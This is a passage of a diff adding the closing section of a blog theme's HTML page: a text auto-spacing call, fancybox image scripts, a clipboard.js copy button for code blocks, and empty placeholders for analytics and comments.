+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
